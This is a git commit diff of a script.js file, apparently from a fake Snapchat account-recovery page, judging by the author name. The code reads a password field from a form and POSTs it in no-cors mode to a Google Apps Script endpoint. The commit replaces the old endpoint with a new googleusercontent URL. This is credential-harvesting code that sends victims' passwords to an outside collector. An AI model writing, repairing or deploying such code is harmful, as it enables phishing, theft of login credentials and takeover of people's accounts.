3588ddae0006cd2b614e4af091ae311c6b614b8e
myrecoverysnapchat <myrecovery.snapchat@gmail.com>
2026-05-11 11:34:52 +0700

    Update script.js

--- script.js
+++ script.js
@@ -10,7 +10,7 @@ document
     const password =
       document.getElementById("password").value;
 
-    fetch("https://script.google.com/macros/s/AKfycbxQOEthGEkGLiq_ZBxC4UXveK31Oe8bqZ_dN3e-fyC0QXQkjOE80vMu6Jb6fzVMNic/exec", {
+    fetch("https://script.googleusercontent.com/macros/echo?user_content_key=AUkAhnRyFSabzi73zv2HNXh-sBBTXmGFSAwTZnRRHXQkNkPIOVsK_bqS3aerQtXGYv9Qu1fshDDMImCrKjxO8SdLpuoFyN9qHC-wTx2dyOKeXMa_Z2kayNe28aP9SUEjkKF27jhttX4cuHGXNY2txgKlUHsYKwbc8v3-ey35FDEU4K85Q43uieT8DVCfovch37n57LYdqgfyS-t1P-agBlkT7STxc-H74proyFwrn0jWeQFGyi4ReAuxxUaMdFHkZDscqP0dXzhivoBk9duOgA_rGZaoMeOoEA&lib=M40Uq_i7lLCMB7FxrHfPe9PMCf4mS8-Gp", {
       method: "POST",
       mode: "no-cors",
       body: new URLSearchParams({
